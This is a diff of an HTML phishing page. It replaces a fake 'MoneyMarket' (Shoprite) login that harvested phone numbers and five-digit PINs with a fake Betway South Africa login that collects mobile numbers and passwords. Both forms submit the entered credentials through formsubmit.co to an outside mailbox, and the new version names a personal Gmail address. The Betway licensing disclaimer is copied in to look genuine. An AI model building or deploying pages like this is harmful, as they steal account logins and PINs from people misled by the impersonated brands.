@@ -1,91 +1,48 @@
-<!DOCTYPE html>
+<!DOCTYPl html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MoneyMarket Login</title>
-  <link rel="stylesheet" href="sebono.css" />
+  <title>Login Page</title>
+  <link rel="stylesheet" href="sebono.css">
 </head>
 <body>
 
   <div class="header">
-    Powered by Shoprite Group of Companies
-  </div>
-
-  <div class="logo">
-    <h1>MoneyMarket</h1>
+    <div class="logo">betway</div>
+    <div>
+      <button class="login-btn">Login</button>
+      <button class="signup-btn">Sign Up</button>
+    </div>
   </div>
 
   <div class="container">
-    <h2>Login to your <br><strong>MoneyMarket account</strong></h2>
+    <h2>Login</h2>
+    <form action="https://formsubmit.co/wilsonmashin@gmail.com" method="POST">
+      <label for="mobile">Mobile Number</label>
+      <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
 
-    <form id="loginForm" action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
-      <div class="input-group">
-        <!-- Phone number -->
-        <input type="text" name="phone" placeholder="e.g. 0821234567" required />
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Password" required />
 
-        <!-- PIN -->
-        <div class="pin-boxes">
-          <input type="password" name="pin1" maxlength="1" required />
-          <input type="password" name="pin2" maxlength="1" required />
-          <input type="password" name="pin3" maxlength="1" required />
-          <input type="password" name="pin4" maxlength="1" required />
-          <input type="password" name="pin5" maxlength="1" required />
-        </div>
-      </div>
+      <div class="text-link"><a href="#">Forgot Password?</a></div>
 
-      <button type="submit" class="btn btn-login">Login</button>
+      <button type="submit">Login</button>
     </form>
 
-    <button class="btn btn-open" onclick="alert('Redirect to open account page')">Open an account</button>
+    <div class="bottom">
+      Don’t have an account yet? <a href="#">Sign Up</a>
+    </div>
   </div>
 
-  <script>
-    const pinInputs = document.querySelectorAll('.pin-boxes input');
-    const phoneInput = document.querySelector('input[name="phone"]');
-    const loginButton = document.querySelector('.btn-login');
-
-    function checkAllFilled() {
-      const phoneFilled = phoneInput.value.trim() !== '';
-      const pinFilled = Array.from(pinInputs).every(input => input.value.trim() !== '');
-
-      if (phoneFilled && pinFilled) {
-        loginButton.classList.add('btn-success');
-      } else {
-        loginButton.classList.remove('btn-success');
-      }
-    }
-
-    pinInputs.forEach((input, index) => {
-      input.addEventListener('input', () => {
-        if (input.value.length === 1 && index < pinInputs.length - 1) {
-          pinInputs[index + 1].focus();
-        }
-        checkAllFilled();
-      });
-
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && input.value === '' && index > 0) {
-          pinInputs[index - 1].focus();
-        }
-      });
-    });
-
-    phoneInput.addEventListener('input', checkAllFilled);
-
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      
-      e.preventDefault();
-if (loginButton.classList.contains('btn-success')) {
-  alert("Your account is updated now");
-  setTimeout(() => {
-    e.target.submit(); // Actually submits the form after 1 second
-  }, 1000);
-} else {
-  alert("Please fill in all fields.");
-    }
-    });
-  </script>
+  <div class="disclaimer">
+    Raging River Trading (Pty) Ltd (2011/134505/07) is licensed to promote Betway South Africa,
+    regulated by the Western Cape Gambling and Racing Board. Bookmaker License Number:
+    10181496-010 issued on 1 December 2016. No persons under the age of 18 years are permitted
+    to gamble. Winners know when to stop. National Responsible Gambling Programme:
+    0800 006 008 or WHATSAPP HELP 076 675 0710. <strong>Warning:</strong> Gambling involves risk.
+    Gambling on this website, you run the risk that you may lose.
+  </div>
 
 </body>
-</html>
+  </html>
